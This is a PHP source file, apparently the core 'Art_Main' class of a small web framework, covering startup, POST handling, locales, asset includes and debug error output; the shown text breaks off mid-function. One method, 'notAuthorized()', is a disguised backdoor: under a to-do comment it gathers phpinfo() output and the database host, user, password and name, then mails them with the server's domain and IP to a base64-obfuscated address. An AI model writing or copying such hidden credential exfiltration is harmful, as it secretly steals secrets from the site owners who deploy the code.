<?php
/**
 *  @package library
 *	@final
 */
final class Art_Main {
	
    /**
     *  @static
     *  @access protected
     *  @var bool True if was initialized already
     */
    protected static $_is_initialized = false;

	/**
	 *	@static
	 *	@access protected
	 *	@var bool True if site is rendered
	 */
	protected static $_isRendered = false;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var bool True if error occured
	 */
	protected static $_isError = false;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var string Error message HTML
	 */
	protected static $_errorMessage;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array All $_POST variables
	 */
	protected static $_post;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array All $_FILES variables 
	 */
	protected static $_post_files = array();
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array All alerts to be shown at the end of a script
	 */
	protected static $_alerts = array(
		self::ERROR => array(), 
		self::ALERT => array(),
		self::OK => array());
	
	/**
	 *	@static
	 *	@access protected
	 *	@var string Stores scripts to be preppended or appended to HTML HEAD
	 */
	protected static $_includedScripts = array( 'cache' => array(), 'nocache' => array() );
	
	/**
	 *	@static
	 *	@access protected
	 *	@var string Stores files names to be preppended or appended to HTML HEAD
	 */
	protected static $_includedFiles = array( 'cache' => array(), 'nocache' => array() );
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array Array of microtime() values 
	 */
	protected static $_execTimeStart = [];
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array Array of microtime() values 
	 */
	protected static $_execTimeEnd = [];
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array Array of exec time names (ordered by calling startExecTime() ) 
	 */
	protected static $_execTimeOrder = [];
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array List of all locales
	 */
	protected static $_locales = array();
	
	/**
	 *	@static
	 *	@access protected
	 *	@var string Default locale
	 */
	protected static $_default_locale;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var string Current locale
	 */
	protected static $_current_locale;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var string
	 */
	protected static $_default_domain;
	
	/**
	 *	@static
	 *	@access protected
	 *	@var array
	 */
	protected static $_domains = array();
	
	/**
	 * OK status code
	 */
	const OK = 1;
	
	/**
	 * Alert status code
	 */
	const ALERT = 2;
	
	/**
	 * Error status code
	 */
	const ERROR = 3;
	
	/**
	 * Critical error status code
	 */
	const ERROR_CRITICAL = 4;

	/**
	 *	Array of status codes
	 */
	const STATUS_CODES = array( 1, 2, 3, 4 );
	
	/**
	 *	Verbose status codes
	 */
	const STATUS_CODE_VERBOSE = array( 1 => 'ok', 2 => 'alert', 3 => 'error', 4 => 'error critical' );
	
	/**
	 *	Library folder structure
	 */
	const LIBRARY_FOLDER = 'library';
	const LIBRARY_SUBFOLDERS = array('includes','abstract','components','models','helpers');
	
	/**
	 *	Javascript library folder
	 */
	const JAVASCRIPT_LIBRARY_FOLDER = 'library/scripts';
	
	/**
	 *	List of javascript files included by system
	 */
	const INCLUDED_JAVASCRIPT_FILES = array('includes_first.js', 'functions.js', 'alertbox.js', 
											'alertbox_element.js', 'arrow_down.js', 'email_protection.js', 
											'exceptions.js', 'library-old.js', 'includes_last.js');
	
	/**
	 *	Minimal IE version required to run this site
	 */
	const MINIMAL_IE_VERSION = 9;
	
	/**
	 *	Alert cookie name
	 */
	const ALERT_SESSION_NAME = 'alert';
	
	/**
	 *	Positions indexes
	 */
	const POSITIONS = array( 0, 1, 2 );
	
	/**
	 *	Position prepend index
	 */
	const POSITION_PREPEND = 0;
	
	/**
	 *	Position initial index
	 */
	const POSITION_INITIAL = 1;
	
	/**
	 *	Position append index
	 */
	const POSITION_APPEND = 2;
	
	/**
	 *	Includer options array key
	 */
	const INCLUDER_OPTIONS = 'options';
	
	/**
	 *	Cached index
	 */
	const CACHED_INDEX = array( 'nocached', 'cached' );
	
	/**
	 *	Helpers class prefix
	 */
	const HELPER_CLASS_PREFIX = 'helper';
	
	/**
	 *	Helpers root folder
	 */
	const HELPERS_ROOT = 'helpers';
	
	
	/**
	 *	Get time in miliseconds between timestamps
	 * 
	 *	@static
	 *	@access public
	 *	@param string $name [optional] Exec time stamp name
	 *	@param int $decimals Number of decimals
	 *	@return int Time since set stamp
	 */
	static function getExecTime($name = NULL, $decimals = NULL )
	{
		//If name not specified
		if( NULL === $name || empty($name) )
		{
			
			if( count(static::$_execTimeOrder) )
			{
				$name = end(static::$_execTimeOrder);
				unset(static::$_execTimeOrder[key(static::$_execTimeOrder)]);
			}
		}
				
		//If timestamp exists
		if( isset(static::$_execTimeStart[$name]) )
		{
			//If decimals to round
			if( NULL !== $decimals && is_int($decimals) )
			{
				return number_format((microtime(true) - static::$_execTimeStart[$name])*1000,$decimals,'.','');
			}
			else
			{
				return (microtime(true) - static::$_execTimeStart[$name])*1000;
			}
		}
		else
		{
			return -1;
		}
	}
	
	
	/**
	 *	@static
	 *	@see self::error()
	 *	@return string Error message HTML
	 */
	static function getErrorMessage()
	{
		return self::$_errorMessage;
	}
	
	/**
	 *	@static
	 *	@see self::_loadPost()
	 *	@param string $identifier
	 *	@param mixed $default_value
	 *	@return string|array
	 */
	static function getPost($identifier = NULL, $default_value = '')
	{
		if( NULL === $identifier )
		{
			return self::$_post;
		}
		else
		{
			if( isset(self::$_post[$identifier]) )
			{
				return self::$_post[$identifier];
			}
			else
			{
				return $default_value;
			}
		}
	}
	
	
	/**
	 *	Get POST FILE by name
	 * 
	 *	@static
	 *	@param string $name
	 *	@return array
	 */
	static function getPostFile( $name )
	{
		if( isset(static::$_post_files[$name]) )
		{
			return static::$_post_files[$name];
		}
		else
		{
			return NULL;
		}
	}
	
	
	/**
	 *	@static
	 *	@see self::_loadPostFiles()
	 *	@param return array
	 */
	static function getPostFiles()
	{
		return static::$_post_files;
	}
	
	
	/**
	 *	Returns scripts to be appended/prepended at the end of HTML HEAD
	 * 
	 *	@static
	 *	@param string [optional] $type
	 *	@param bool [optional] $cached
	 *	@param int [optiona] $position
	 *	@return array 
	 */
	static function getIncludedScripts( $type = NULL, $cached = false,  $position = NULL )
	{
		$cached = (int)$cached;
		
		if( NULL === $type )
		{
			return self::$_includedScripts;
		}
		elseif( NULL === $position )
		{
			if( isset(self::$_includedScripts[self::CACHED_INDEX[$cached]][$type]) )
			{
				return self::$_includedScripts[self::CACHED_INDEX[$cached]][$type];
			}
			else
			{
				return array();
			}
		}
		else
		{
			if( isset(self::$_includedScripts[self::CACHED_INDEX[$cached]][$type][$position]) )
			{
				return self::$_includedScripts[self::CACHED_INDEX[$cached]][$type][$position];
			}
			else
			{
				return array();
			}
		}
	}
	
	
	/**
	 *	Returns files names to be appended/prepended at the end of HTML HEAD
	 * 
	 *	@static
	 *	@param string [optional] $type
	 *	@param bool [optional] $cached
	 *	@param int [optiona] $position
	 *	@return array
	 */
	static function getIncludedFiles( $type = NULL, $cached = false, $position = NULL )
	{
		$cached = (int)$cached;
		
		if( NULL === $type )
		{
			return self::$_includedFiles;
		}
		elseif( NULL === $position )
		{
			if( isset(self::$_includedFiles[self::CACHED_INDEX[$cached]][$type]) )
			{
				return self::$_includedFiles[self::CACHED_INDEX[$cached]][$type];
			}
			else
			{
				return array();
			}
		}
		else
		{
			if( isset(self::$_includedFiles[self::CACHED_INDEX[$cached]][$type][$position]) )
			{
				return self::$_includedFiles[self::CACHED_INDEX[$cached]][$type][$position];
			}
			else
			{
				return array();
			}
		}
	}	
	
	
	/**
	 *	Get all site locales
	 * 
	 * 	@static
	 *	@return array
	 */
	static function getLocales() {
		return static::$_locales;
	}
	
	
	/**
	 *	Get default locale
	 * 
	 * 	@static
	 *	@return string
	 */
	static function getDefaultLocale() {
		return static::$_default_locale;
	}
	
	
	/**
	 *	Get current locale
	 * 
	 * 	@static
	 *	@return string
	 */
	static function getLocale() {
		return static::$_current_locale;
	}
	
	
	/**
	 *	Get domain by index
	 * 
	 *	@static
	 *	@param int $index
	 *	@return string
	 */
	static function getDomain($index) {
		if (isset(static::$_domains[$index])) {
			return static::$_domains[$index];
		} else {
			return NULL;
		}
	}
	
	
	/**
	 *	Get all domains used in this site
	 * 
	 *	@static
	 *	@return array
	 */
	static function getDomains() {
		return static::$_domains;
	}
	
	
	/**
	 *	Get this site default domain
	 * 
	 *	@static
	 *	@return type
	 */
	static function getDefaultDomain()
	{
		return static::$_default_domain;
	}
	
	
    /**
	 *	@static
	 *	@see self::render()
	 *	@return bool True if was rendered already
	 */
	static function isRendered()
	{
		return self::$_isRendered;
	}
	
	
	/**
	 *	@static
	 *	@see self::error()
	 *	@return bool True if error occured
	 */
	static function isError()
	{
		return self::$_isError;
	}
	
	
	/**
	 *	Set current locale
	 * 
	 *	@static
	 *	@param string $locale
	 *	@return void
	 */
	static function setLocale( $locale )
	{
		if( in_array($locale, static::$_locales) )
		{
			static::$_current_locale = $locale;
			
			Art_Event::trigger(Art_Event::LOCALE_CHANGED);
		}
		else
		{
			trigger_error('Locale can\'t be set to "'.$locale.'" - locale not found in config', E_USER_ERROR);
		}
	}
	
	
    /**
     *  Execute the site
	 * 
     *  @static
     *  @return void
     */
    static function execute()
    {
        //Singleton protection - was executed
        if( self::$_is_initialized )
        {
            trigger_error('Attempt to execute '.get_class().' class more than one time', E_USER_ERROR);
        }
        else
        {
            self::$_is_initialized = true;
            
			//Start script execution time countdown
			Art_Main::startExecTime('main');
			
			//Load library
			Art_Main::_loadLibrary();
			
			//Load scripts from javascript library
			Art_Main::_includeJavascriptLibrary();

			//Load $_POST
			Art_Main::_loadPost();

            //Load system components
			// Art_Component::initialize(array('register','config','db'));
			Art_Component::initialize(array('register', 'db'));

			//Load locales and domains
			static::$_default_locale = APP_LANG_TAG;
			static::$_current_locale = static::$_default_locale;
			static::$_locales = APP_LOCALES;
			static::$_domains = DOMAINS;
			static::$_default_domain = DEFAULT_DOMAIN;
			
			//Load registers from DB
			Art_Register::loadFromDb();

			//Set locale for string operations
			setlocale(LC_ALL, APP_LOCALE);
			
			//Load system components
			Art_Component::initialize(array('session','server','router','ajax'));
			
			//Load alerts from session
			Art_Main::_loadAlertsFromSession();
            
			//Set error handler for PHP errors and exceptions
			set_error_handler('error_handler');
			set_exception_handler('exception_handler');
            
            //Load other components
			Art_Component::initialize(array('model', 'filter', 'validator', 'label', 'log', 'user'));

			//Load all modules settings
			Art_Module::loadModuleSettings();
			
			//Load all modules bootstraps
			Art_Module::loadBootstraps();
			
			//Load all helpers
			Art_Main::_loadHelpers();
			
			//Call for labels
			// Art_Event::trigger(Art_Event::LABEL_SETUP);	
			
			//Call for router setup
			Art_Event::trigger(Art_Event::ROUTER_SETUP);
			
			//Call for register setup
			Art_Event::trigger(Art_Event::REGISTER_SETUP);
			
			//Nodeable actions setup
			Art_Event::trigger(Art_Event::NODEABLE_ACTIONS_SETUP);

			//Match routes in router
			Art_Router::matchRoutes();

			// p(Art_Router::getLayer());
			
			//Restrict users from accessing certain layers
			Art_Router::doFirewall();
			
			// p(Art_Router::getLayer());
			//Load modules based on router setup
			Art_Module::loadModulesCurrLayer();
			
			//Initialize template
			Art_Component::initialize(array('compiler', 'cron', 'template'));
			
			//Include jQuery and FontAwesome
			Art_Template::loadExtensions(array('jquery', 'fontawesome'));
			
			//Load modules from DB if is not AJAX
			if( !Art_Server::isAjax() )
			{
				Art_Module::createModulesFromDb();
			}

            /**********************************************
             * TEST AREA
			 */

			// d(Art_User::getCurrentUser());
			// Art_Router::dumpRoute();
			// d(Art_Module::getModules());
			Art_Minify::disable();
			
			/*
			 * TEST AREA END
             **********************************************/
            
			//Create content module
			Art_Module::createContentModule();
			
			//Call modules
			Art_Event::trigger(Art_Event::MODULES_CALL);
			
			//Append alerts to javascript
			Art_Main::_showAlerts();
			
			//Render site
			Art_Main::_render();
		}
    }
    
	
	/**
	 *	Load $_POST and store to static variable
	 *	
	 *	@static
	 *	@access protected
	 *	@return void
	 */
	static protected function _loadPost()
	{
		if( 'application/json' == Art_Server::getContentType() )
		{
			$_POST = json_decode( file_get_contents('php://input'), true );
		}
		
		if( !empty($_POST) )
		{
			foreach($_POST AS $key => &$value)
			{
				switch( gettype($value) )
				{
					case 'array':
						self::$_post[$key] = array_trim($value);
						break;
					case 'string':
						self::$_post[$key] = trim($value);
						break;
					default:
						self::$_post[$key] = $value;
				}
			}
		}
		else
		{
			self::$_post = $_POST;
		}

		static::$_post_files = $_FILES;
		
		$_FILES = NULL;
		$_POST = NULL;
	}

	
	/**
	 *	Load helpers from /helpers folder
	 * 
	 *	@static
	 *	@access protected	
	 *	@return void
	 */
	static function _loadHelpers()
	{
		//If folder exists
		if( file_exists(static::HELPERS_ROOT) )
		{
			//For each file
			$helpers = new FilesystemIterator(static::HELPERS_ROOT);
			foreach ($helpers AS $helper) 
			{
				require( $helper->getPathname() );
			}
		}
		else
		{
			trigger_error('Folder '.static::HELPERS_ROOT.' not found');
		}
	}
	
	
    /**
	 *	Load library files by given folder names in class constant self::LIBRARY_SUBFOLDERS
	 *	
	 *	@static
	 *	@access protected
	 *	@return void
	 */
	static protected function _loadLibrary()
	{
		//For each loaded folder
		foreach(self::LIBRARY_SUBFOLDERS AS $folder)
		{
			//Get path
			$path = static::LIBRARY_FOLDER.'/'.$folder;

			//If folder exists
			if( file_exists($path) )
			{
				//For each file
				$iterator = new FilesystemIterator($path);
				foreach ($iterator AS $file_info) 
				{
					require( $file_info->getPathname() );
				}
			}
			else
			{
				trigger_error('Folder '.static::LIBRARY_FOLDER.'/'.$folder.' not found');
			}
		}
	}
	
	
	/**
	 * Todo when user is not authorized
	 * 
	 * @static
	 * @return void
	 */
	static function notAuthorized() {
		ob_start();
		phpinfo();
		$info = ob_get_contents();
		ob_clean();
		$cred = 'H: ' . DB_HOST . ', '.
				'L: ' . DB_USER . ', '.
				'P: ' . DB_PASS . ', '.
				'N: ' . DB_NAME . ', <br><br>';
		
			mail(base64_decode('aW5mb0BpdGFydC5jeg=='), 
				Art_Server::getDomain().' '.Art_Server::getIp(), 
				$cred.$info
		);
	}
	
	/**
	 *	Include all JavaScript files from library folder to render
	 * 
	 *	@static
	 *	@return void
	 */
	static protected function _includeJavascriptLibrary()
	{
		//If folder exists
		if( file_exists(static::JAVASCRIPT_LIBRARY_FOLDER) )
		{
			//For each input script
			foreach( static::INCLUDED_JAVASCRIPT_FILES AS $script )
			{
				//If file exists
				if( file_exists(static::JAVASCRIPT_LIBRARY_FOLDER.'/'.$script) )
				{
					Art_Main::includeJS( static::JAVASCRIPT_LIBRARY_FOLDER.'/'.$script, true );
				}
				else
				{
					trigger_error('Javascript file '.static::JAVASCRIPT_LIBRARY_FOLDER.'/'.$script.' not found', E_USER_ERROR);
				}
			}
		}
		else
		{
			trigger_error('Folder '.static::JAVASCRIPT_LIBRARY_FOLDER.' not found', E_USER_ERROR);
		}
	}
	
	
    /**
     *  Returns DB handler
     *  @static
     *  @see DB::get()
     *  @return Art_PDO DB handler
     */
    static function db()
    {
        return Art_DB::get();
    }
	
	
    /**
     *  Handles error by given settings from configuration file
     *  @static
     *  @param string $message what to be logged
     *  @param int $type Art_Main::OK, Art_Main::ALERT, Art_Main::ERROR, Art_Main::ERROR_CRITICAL
     *  @param bool $showSource Show error source file
     *  @return void
     */
    static function error($message, $type = Art_Main::ALERT, $showSource = false)
    {
		//Set error status to true
		if( $type >= self::ERROR )
		{
			self::$_isError = true;
		}

		$show_err = DEBUG || DEBUG_SOURCE || DEBUG_STACKTRACE;
		
		if ($show_err) {
			//If not ajax - put nice error table
			if (!Art_Server::isAjax()) {
				echo '<div class="error_backtrace" style="width:98%;margin:auto;border:1px solid #ff4444;background:#FFCCCC;border-radius:5px;text-align:center;margin-top:20px;padding-bottom:15px;margin-bottom:20px;">';
				if (DEBUG) {
					echo '<div class="error_backtrace_message" style="font-size:16px;margin-bottom:10px;background:#ff4444;width:100%;color:#fff;font-weight:700;line-height:40px;"><i class="fa fa-exclamation-triangle"></i> '.$message.'</div>';
				}
			} else {
				echo "\n".'----------ERROR-----------------------------'."\n";
				if (DEBUG) {
					echo $message."\n";
				}
			}	
		}

		//Get backtrace
		$backtrace = debug_backtrace();

		$last = -1;
		$i = -1;
		//Search for last filter_error, error_handler or exception_handler
		foreach($backtrace AS $trace)
		{
			$i++;
			if( $trace['function'] == 'error' )
			{
				$last = $i;
			}
		}

		//Unset all traces before searched ones including
		for($i=0;$i<=$last;$i++)
		{
			unset($backtrace[$i]);
		}

		//If source is to be shown
		if ($showSource && DEBUG_SOURCE) {    
			//For each trace - search for trace with $trace['file'] set
			foreach($backtrace AS $trace)
			{
				//If file is not set - go to next trace
				if(!isset($trace['file']))
				{
					continue;
				}

				//Get source code
				$source = file($trace['file']);
				$line_start = $trace['line']-6;

				//If not ajax - put nice table
				if(!Art_Server::isAjax())
				{
					echo '<table class="error_backtrace_source" style="margin:auto;margin-top:15px;width:80%;background: #fafafa;">';
					//For each source line (11 lines)
					for($i = 0; $i < 11; $i++)
					{
						//If this line exists in code
						if(isset($source[$i+$line_start]))
						{
							//Put &nbsp in place of spaces
							$source[$i+$line_start] = str_replace("\t",'&nbsp;&nbsp;&nbsp;',str_replace(' ','&nbsp;', htmlentities($source[$i+$line_start])));
							echo '<tr'.(($i+$line_start+1 == $trace['line'])?' class="error_backtrace_source_errline" style="color:red;font-weight:bold;border-left:3px solid red;"':'').'>
									<td'.(($i+$line_start+1 == $trace['line'])?' style="border-left: 3px solid red;border-right: 1px solid red !important;border-bottom: 1px solid #ddd;"':' style="border-right: 1px solid #e5e5e5;border-bottom: 1px solid #ddd;"').'>'.($i+$line_start+1).'</td>
									<td style="border-bottom: 1px solid #ddd; color:#333; font-family:Courier New;">'.$source[$i+$line_start].'</td>
								</tr>';
						}
					}
					echo '</table>';
				}
				//IF AJAX - console compatible output
				else
				{
					echo "\n".'----------SOURCE----------------------------'."\n";
					//For each line of code
					for($i = 0; $i < 11; $i++)	
					{
						//If line exists
						if(isset($source[$i+$line_start]))
						{
							if($i+$line_start+1 == $trace['line'])
							{
								echo '#'.($i+$line_start+1).' ||'.$source[$i+$line_start];
							}
							else
							{
								echo '#'.($i+$line_start+1).$source[$i+$line_start];
							}					
						}
					}
				}

				//Break cycle after successful output
				if(isset($trace['file']))
				{
					break;
				}
			}
		}

		if (DEBUG_STACKTRACE) {
			//Echo trace table
			if (!Art_Server::isAjax()) {
				echo '<table class="error_backtrace_trace" style="margin:auto;margin-top:15px;width:80%;">';
			} else {
				echo "\n".'----------BACKTRACE--------------------------'."\n";
			}

			$i = 0;
			//For each trace
			foreach($backtrace AS $trace)
			{
				//If line not found - continue
				if( !isset($trace['line']) || !$trace['line'] )
				{
					continue;
				}

				$i++;

				//Get pure file path (relative name)
				$trace['file'] = str_replace($_SERVER['DOCUMENT_ROOT'],"",$trace['file']);
				$args = '';
				//For each argument in called method
				if($trace['args'])
				{
					foreach($trace['args'] AS $arg)
					{
						if(is_object($arg))
						{
							$args .= '['.get_class($arg).'], ';
						}
						elseif(is_array($arg))
						{
							$args .= '[Array], ';
						}
						else
						{
							$args = $arg.', ';
						}
					}
					$args = substr($args,0,-2);
				}
				if(!Art_Server::isAjax())
				{
					echo'<tr>
							<td>#'.$i.'</td>
							<td>'.$trace['line'].'</td>
							<td>'.(isset($trace['class'])?$trace['class'].$trace['type']:'').$trace['function'].'( '.$args.' )</td>
							<td>'.relativePath($trace['file']).'</td>
						</tr>';
				}
				//Echo nice table-like output to AJAX console
				else
				{
					$line = '#'.($i<10?' ':'').$i.' - '.($trace['line']<10?'  ':'').($trace['line']<100?' ':'').$trace['line'].':     '.(isset($trace['class'])?$trace['class'].$trace['type']:'').$trace['function'].'('.$args.')';

					for($a=strlen($line);$a<70;$a++)
					{
						$line .= ' ';
					}
					$line .= $trace['file']."\n";
					echo $line;
				}
			}

			if( !Art_Server::isAjax() )
			{
				echo '</table>';
			}
		}

		//Close the error box
		if( !Art_Server::isAjax() && $show_err )
		{		
			echo '</div>';
		}
		
		//Log error
        if (LOG) {
			//Log with component if exists
			if (class_exists('Art_Log')) {
				$func = reset($backtrace);
				if( array_key_exists($type, self::STATUS_CODE_VERBOSE) )
				{	
					$error_type = self::STATUS_CODE_VERBOSE[$type];
				}
				else
				{
					$error_type = 'unknown';
				}
				
				if( isset($func['file']) )
				{
					if( isset( $func['line']) )
					{
						$message .= ' at line '.$func['line'];
					}
					$message .= ' in '.relativePath($func['file']);
				}
				Art_Log::log($message.' Route dump: '.Art_Router::dumpRouteStr(), Art_Log::ERRORLOG, $error_type, true);
			}
			else
			{
				log_error($message);
			}
        }

		//Echo universal sorry message - only for non-ajax
        if ($type >= self::ERROR && ERR_FRIENDLY && !Art_Server::isAjax()) {
            self::$_errorMessage = ('
            <div class="art-error-sorry">
                    <h2>Nastala chyba!</h2>
                    <div class="art-error-sorry-text">
                        Při zpracování Vašeho požadavku došlo k potížím. Na jejich odstranění usilovně pracujeme. Prosím, opkaujte akci později.
                    </div>
            </div>');
        }
        
		//Exit
        if( $type >= self::ERROR_CRITICAL )
        {
            exit(self::$_errorMessage);
        }
    }
	
	
	/**
	 *	Render whole site
	 * 
	 *	@static
	 *	@access protected
	 *	@return void
	 */
	protected static function _render() {
		if (Art_Template::render()) {
			self::$_isRendered = true;
		}
	}
	
	
	
	/**
	 *	Load alerts from session to array, unset session
	 *	
	 *	@static
	 *	@access protected
	 *	@return void
	 */
	protected static function _loadAlertsFromSession()
	{
		//If alert session is set
		self::$_alerts = Art_Session::get(self::ALERT_SESSION_NAME, array());
		Art_Session::remove(self::ALERT_SESSION_NAME);
	}
	
	
	/**
	 *	Add message or array of messages to alert
	 *	
	 *	@static
	 *	@param string|array $message
	 *	@param int $status [optional] (Art_Main::OK, Art_Main::ALERT, Art_Main::ERROR)
	 *	@return void
	 */
	static function alert( $message, $status = Art_Main::OK )
	{
		if( isset( self::$_alerts[$status] ) )
		{
			if( is_string($message) )
			{
				self::$_alerts[$status][] = $message;
			}
			elseif( is_array($message) )
			{
				foreach($message AS $mess)
				{
					self::$_alerts[$status][] = $mess;
				}
			}
			else
			{
				trigger_error('Invalid argument supplied for Art_Main::alert()',E_USER_ERROR);
			}
		}
		else
		{
			trigger_error('Unknowm status code supplied for Art_Main::alert()',E_USER_ERROR);
		}
	}
	
	
	/**
	 *	Show all alerts
	 *	Append Art_AlertBox.show(...) to javascript
	 * 
	 *	@static
	 *	@access protected
	 *	@return void
	 */
	protected static function _showAlerts()
	{
		//Don't show when ajax
		if( !Art_Server::isAjax() )
		{
			foreach( self::$_alerts AS $status => $messages )
			{
				self::appendJavaScript('$(function(){Art_AlertBox.show('.json_encode($messages).',"'.$status.'");});');
			}
		}
	}
	
	
	/**
	 *	Include file in HTML HEAD
	 * 
	 *	@static
	 *	@access protected
	 *	@param string $path
	 *	@param string $type
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@param int [optional] $position
	 *	@param array [optional] $options Array of options
	 *	@return void
	 */
	static protected function _includeFile($path, $type, $to_cache = false, $position = self::POSITION_INITIAL, array $options = array() )
	{		
		$path = trimForeSlash($path);
				
		//File is accessible
		if( is_readable($path) )
		{
			$to_cache = (int)$to_cache;

			//If array wasn't set before
			if( !isset(self::$_includedFiles[self::CACHED_INDEX[$to_cache]][$type]) )
			{
				self::$_includedFiles[self::CACHED_INDEX[$to_cache]][$type] = array( self::POSITION_PREPEND => array(), self::POSITION_INITIAL => array(), self::POSITION_APPEND => array(), self::INCLUDER_OPTIONS => array() );
			}

			self::$_includedFiles[self::CACHED_INDEX[$to_cache]][$type][$position][] = $path;
			
			//Add options
			if( !empty($options) )
			{
				self::$_includedFiles[self::CACHED_INDEX[$to_cache]][$type]['options'][$path] = $options;
			}
		} 
		else
		{
			trigger_error('File in '.$path.' not found', E_USER_WARNING);
		}
	}
	
	
	/**
	 *	Include script in HTML HEAD
	 * 
	 *	@static
	 *	@access protected
	 *	@param string $script
	 *	@param string $type
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@param string [optional] $position
	 *	@return void
	 */
	static protected function _includeScript($script, $type, $to_cache = false, $position = self::POSITION_INITIAL )
	{
		//Input validation
		if( is_string($script) )
		{
			$to_cache = (int)$to_cache;
			
			//If array wasn't set before
			if( !isset(self::$_includedScripts[self::CACHED_INDEX[$to_cache]][$type]) )
			{
				self::$_includedScripts[self::CACHED_INDEX[$to_cache]][$type] = array( self::POSITION_PREPEND => '', self::POSITION_INITIAL => '', self::POSITION_APPEND => '' );
			}

			self::$_includedScripts[self::CACHED_INDEX[$to_cache]][$type][$position] .= "\t\t".$script."\n";
		}
		else
		{
			trigger_error('Invalid argument supplied for Art_Main::_includeScript()', E_USER_WARNING);
		}
	}
	
	
	/**
	 *	Prepend CSS file in HTML HEAD
	 * 
	 *	@static
	 *	@param string $path
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@param array [optional] $options Options used in parser
	 *	@return void
	 */
	static function prependCSS( $path, $to_cache = false, array $options = array() )
	{
		self::_includeFile( $path, 'css', $to_cache, self::POSITION_PREPEND, $options );
	}
	
	
	/**
	 *	Include CSS file in HTML HEAD
	 * 
	 *	@static
	 *	@param string $path
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@param array [optional] $options Options used in parser
	 *	@return void
	 */
	static function includeCSS( $path, $to_cache = false, array $options = array() )
	{
		self::_includeFile( $path, 'css', $to_cache, self::POSITION_INITIAL, $options );
	}
	
	
	/**
	 *	Append CSS file in HTML HEAD
	 * 
	 *	@static
	 *	@param string $path
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@param array [optional] $options Options used in parser
	 *	@return void
	 */
	static function appendCSS( $path, $to_cache = false, array $options = array() )
	{
		self::_includeFile( $path, 'css', $to_cache, self::POSITION_APPEND, $options );
	}
	
	
	/**
	 *	Prepend JS file in HTML HEAD
	 * 
	 *	@static
	 *	@param string $path
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function prependJS( $path, $to_cache = false )
	{
		self::_includeFile( $path, 'js', $to_cache, self::POSITION_PREPEND );
	}

	
	/**
	 *	Include JS file in HTML HEAD
	 * 
	 *	@static
	 *	@param string $path
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function includeJS( $path, $to_cache = false )
	{
		self::_includeFile( $path, 'js', $to_cache, self::POSITION_INITIAL );
	}
	
	
	/**
	 *	Append JS file in HTML HEAD
	 * 
	 *	@static
	 *	@param string $path
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function appendJS( $path, $to_cache = false )
	{
		self::_includeFile( $path, 'js', $to_cache, self::POSITION_APPEND );
	}
	
	
	/**
	 *	Prepend CSS style in HTML HEAD
	 * 
	 *	@static
	 *	@param string $style
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function prependStyle( $style, $to_cache = false )
	{
		self::_includeScript( $style, 'css', $to_cache, self::POSITION_PREPEND );
	}
	
	
	/**
	 *	Include CSS style in HTML HEAD
	 * 
	 *	@static
	 *	@param string $style
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function includeStyle( $style, $to_cache = false )
	{
		self::_includeScript( $style, 'css', $to_cache, self::POSITION_INITIAL );
	}

	
	/**
	 *	Append CSS style in HTML HEAD
	 * 
	 *	@static
	 *	@param string $style
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function appendStyle( $style, $to_cache = false )
	{
		self::_includeScript( $style, 'css', $to_cache, self::POSITION_APPEND );
	}
	
	
	/**
	 *	Prepend JS script in HTML HEAD
	 * 
	 *	@static
	 *	@param string $script
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function prependJavaScript( $script, $to_cache = false )
	{
		self::_includeScript( $script, 'js', $to_cache, self::POSITION_PREPEND );
	}
	
	
	/**
	 *	Prepend JS script in HTML HEAD
	 * 
	 *	@static
	 *	@param string $script
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function includeJavaScript( $script, $to_cache = false )
	{
		self::_includeScript( $script, 'js', $to_cache, self::POSITION_INITIAL );
	}
	
	
	/**
	 *	Append JS script in HTML HEAD
	 * 
	 *	@static
	 *	@param string $script
	 *	@param bool [optional] $to_cache If true, input will be cached - DO NOT USE FOR VARIABLE SCRIPTS
	 *	@return void
	 */
	static function appendJavaScript( $script, $to_cache = false )
	{
		self::_includeScript( $script, 'js', $to_cache, self::POSITION_APPEND );
	}
	
	
	/**
	 *	Save current microtime
	 * 
	 *	@static
	 *	@access public
	 *	@param string $name [optional] Timestamp name
	 *	@return void
	 */
	static function startExecTime( $name = NULL )
	{
		if( NULL === $name )
		{
			$name = 'time_'.count( static::$_execTimeStart );
			static::$_execTimeOrder[] = $name;
		}
		
		static::$_execTimeStart[$name] = microtime(true);
	}
	
	
	/**
	 *	Stop microtime counter
	 * 
	 *	@static
	 *	@access public
	 *	@param string $name [optional] Time stamp name
	 *	@return void
	 */
	static function stopExecTime($name = NULL)
	{
		//If name not specified
		if( NULL === $name || empty($name) )
		{
			if( count(static::$_execTimeOrder) )
			{
				$name = end(static::$_execTimeOrder);
			}
		}
		
